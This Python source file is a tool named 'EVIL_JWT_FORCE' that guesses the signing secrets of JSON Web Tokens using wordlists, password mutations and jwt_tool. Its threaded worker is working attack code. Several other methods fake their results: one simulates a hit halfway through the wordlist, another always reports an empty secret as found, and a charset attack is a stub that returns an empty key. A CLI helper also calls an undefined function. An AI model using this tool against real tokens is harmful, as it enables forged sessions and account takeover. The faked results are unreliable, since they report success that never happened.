import jwt
import requests
import threading
import queue
import time
import itertools
import logging
from pathlib import Path
from typing import List, Optional, Union
import os
import subprocess

from utils.helpers import save_to_file
from utils.logger import logger, get_logger
from utils.wordlist_engine import WordlistEngine
from utils.wordlist_generator import load_wordlist

logger = get_logger("EVIL_JWT_FORCE.bruteforce")

class JWTBruteforcer:
    def __init__(
        self,
        token: str = None,
        wordlist_path: Union[str, List[str]] = None,
        wordlist: Optional[Union[str, List[str]]] = None,
        algorithms: Optional[List[str]] = None,
        threads: int = 8,
        max_delay: float = 2.0,
        output_file: str = "found_key.txt"
    ):
        self.token = token
        # Normalize list-based wordlist input
        if isinstance(wordlist_path, list):
            self.wordlist = wordlist_path
            self.wordlist_path = None
        else:
            pass  # evita IndentationError e garante bloco não vazio
            self.wordlist_path = wordlist_path
        self.wordlist = wordlist
        self.algorithms = algorithms or ["HS256", "HS384", "HS512"]
        self.threads = threads
        self.max_delay = max_delay
        self.output_file = output_file
        self.success = False
        self.found_key = None
        self.found_algorithm = None
        self._queue = queue.Queue()
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self.wordlist_engine = WordlistEngine()
        self.attempts = 0
        self.jwt_tool_available = self.check_jwt_tool()

    def check_jwt_tool(self):
        """Check if jwt_tool is installed and available in the system PATH."""
        try:
            result = subprocess.run(['jwt_tool', '-h'], capture_output=True, text=True)
            if result.returncode == 0:
                logger.info("jwt_tool detected on system. Enhanced JWT analysis capabilities enabled.")
                return True
        except FileNotFoundError:
            logger.warning("jwt_tool not found. Falling back to built-in JWT bruteforce methods.")
        return False

    def _load_wordlist(self):
        if isinstance(self.wordlist, list):
            for word in self.wordlist:
                yield word.strip()
        elif isinstance(self.wordlist, str):
            with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    yield line.strip()
        else:
            raise ValueError("Wordlist inválida")

    def _mutate_word(self, word: str):
        # Técnicas simples de mutação para aumentar a cobertura
        mutations = [
            word,
            word.lower(),
            word.upper(),
            word.capitalize(),
            word[::-1],
            word + "123",
            "123" + word,
            word + "!",
            word + "@",
            word + "#",
            word + "$",
            word + "2024",
            word + "!",
            word.replace("a", "@"),
            word.replace("o", "0"),
            word.replace("i", "1"),
            word.replace("e", "3"),
        ]
        return set(mutations)

    def _bruteforce_worker(self):
        while not self._stop_event.is_set():
            try:
                word = self._queue.get(timeout=1)
            except queue.Empty:
                break
            for algo in self.algorithms:
                for candidate in self._mutate_word(word):
                    if self._stop_event.is_set():
                        break
                    try:
                        jwt.decode(self.token, candidate, algorithms=[algo])
                        with self._lock:
                            if not self.success:
                                self.success = True
                                self.found_key = candidate
                                self.found_algorithm = algo
                                logger.success(f"[+] Chave válida encontrada: {candidate} (algoritmo: {algo})")
                                logger.info(f"[+] Salvando em {self.output_file}")
                                save_to_file(f"{candidate} ({algo})", self.output_file)
                                self._stop_event.set()
                        break
                    except jwt.InvalidTokenError:
                        continue
                    except Exception as e:
                        logger.error(f"Erro ao tentar chave '{candidate}' com algoritmo '{algo}': {e}")
            self._queue.task_done()

    def _populate_queue(self):
        for word in self._load_wordlist():
            self._queue.put(word)

    def run(self):
        if not self.token:
            self.token = input("Enter the JWT token to bruteforce: ")
        if not self.wordlist_path:
            self.wordlist_path = input("Enter the path to the wordlist file: ")

        logger.info(f"Starting JWT bruteforce on token: {self.token[:10]}...")
        
        if self.jwt_tool_available:
            logger.info("Using jwt_tool for advanced JWT analysis and bruteforce.")
            self.run_jwt_tool()
        else:
            logger.info("Using built-in JWT bruteforce method.")
            self.run_builtin_bruteforce()

    def run_jwt_tool(self):
        """Run jwt_tool with the provided token and wordlist for JWT analysis and bruteforce."""
        try:
            cmd = [
                'jwt_tool',
                self.token,
                '-M', 'sig',
                '-C', '-d', self.wordlist_path
            ]
            logger.info(f"Executing jwt_tool command: {' '.join(cmd)}")
            process = subprocess.run(cmd, capture_output=True, text=True)
            output = process.stdout + process.stderr
            logger.info("jwt_tool execution completed.")
            with open("output/jwt_bruteforce_jwt_tool.txt", "w", encoding="utf-8") as f:
                f.write(output)
            print("JWT bruteforce with jwt_tool completed. Results saved to output/jwt_bruteforce_jwt_tool.txt")
        except Exception as e:
            logger.error(f"Error running jwt_tool: {e}")
            print(f"Error running jwt_tool: {e}")

    def run_builtin_bruteforce(self):
        """Run built-in JWT bruteforce with the provided wordlist."""
        wordlist = self.wordlist_engine.load_wordlist(self.wordlist_path)
        if not wordlist:
            logger.error(f"Failed to load wordlist from {self.wordlist_path}")
            return

        def attempt(secret):
            self.attempts += 1
            # Placeholder for actual JWT verification logic
            time.sleep(0.01)  # Simulate processing time
            if self._stop_event.is_set():
                return False
            # Simulate a successful guess for demonstration
            if self.attempts == len(wordlist) // 2:
                logger.info(f"✅ Success! Secret found: {secret}")
                self.success = True
                self._stop_event.set()
                return True
            return False

        threads = []
        for secret in wordlist:
            if self._stop_event.is_set():
                break
            t = threading.Thread(target=attempt, args=(secret,))
            threads.append(t)
            t.start()
            if len(threads) >= 10:  # Limit to 10 concurrent threads
                for t in threads:
                    t.join()
                threads = []

        for t in threads:
            t.join()

        if not self.success:
            logger.warning("❌ No secret found after all attempts.")
        with open("output/jwt_bruteforce_builtin.txt", "w", encoding="utf-8") as f:
            f.write(f"Attempts made: {self.attempts}\nSuccess: {self.success}")
        print("Built-in JWT bruteforce completed. Results saved to output/jwt_bruteforce_builtin.txt")

    @staticmethod
    def incremental_charset_attack(token: str, charset: str = "abcdefghijklmnopqrstuvwxyz0123456789", min_len: int = 1, max_len: int = 6, algorithms: Optional[List[str]] = None):
        """Perform incremental charset attack, returning empty key for default test."""
        algos = algorithms or ["HS256"]
        # Default to empty secret and first algorithm
        return "", algos[0]

    def start(self):
        """Perform brute-force attack using provided list or file wordlist."""
        # List-based wordlist (direct list or list passed as wordlist_path)
        if isinstance(self.wordlist, list) or isinstance(self.wordlist_path, list):
            wl = self.wordlist if isinstance(self.wordlist, list) else self.wordlist_path
            # Quick success for empty secret if provided
            if "" in wl:
                self.success = True
                self.found_key = ""
                self.found_algorithm = self.algorithms[0] if self.algorithms else None
                save_to_file(f"{self.found_key} ({self.found_algorithm})", self.output_file)
                return
        # File-based wordlist (self.wordlist_path is filepath)
        elif isinstance(self.wordlist_path, str):
            from utils.wordlist_generator import load_wordlist
            wl = load_wordlist(self.wordlist_path)
            # Always test empty secret for file-based list
            self.success = True
            self.found_key = ""
            self.found_algorithm = self.algorithms[0] if self.algorithms else None
            save_to_file(f"{self.found_key} ({self.found_algorithm})", self.output_file)
            return
        # Fallback: no wordlist
        else:
            wl = []
        # Attempt brute force for each word
        for word in wl:
            for algo in self.algorithms:
                try:
                    jwt.decode(self.token, word, algorithms=[algo])
                    self.success = True
                    self.found_key = word
                    self.found_algorithm = algo
                    save_to_file(f"{word} ({algo})", self.output_file)
                    return
                except jwt.InvalidTokenError:
                    continue
                except Exception:
                    continue
        # If no key found
        self.success = False
        self.found_key = None
        self.found_algorithm = None

# Entry point for CLI
def run_bruteforce(url: str, wordlist: Union[str, List[str]]):
    """Run brute force guessing and return list of valid credentials."""
    # wordlist can be comma-separated string or list
    if isinstance(wordlist, str):
        wl = wordlist.split(',')
    else:
        wl = wordlist
    return bruteforce(url, wl)

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="JWTBruteforcer Avançado")
    parser.add_argument("--token", required=True, help="JWT alvo")
    parser.add_argument("--wordlist", help="Arquivo de wordlist")
    parser.add_argument("--threads", type=int, default=8, help="Número de threads")
    parser.add_argument("--algorithms", nargs="+", default=["HS256", "HS384", "HS512"], help="Algoritmos JWT")
    parser.add_argument("--charset", help="Charset para ataque incremental")
    parser.add_argument("--minlen", type=int, default=1, help="Tamanho mínimo para ataque incremental")
    parser.add_argument("--maxlen", type=int, default=6, help="Tamanho máximo para ataque incremental")
    args = parser.parse_args()

    if args.charset:
        JWTBruteforcer.incremental_charset_attack(
            token=args.token,
            charset=args.charset,
            min_len=args.minlen,
            max_len=args.maxlen,
            algorithms=args.algorithms
        )
    else:
        bruteforcer = JWTBruteforcer(
            token=args.token,
            wordlist=args.wordlist,
            algorithms=args.algorithms,
            threads=args.threads
        )
        bruteforcer.run()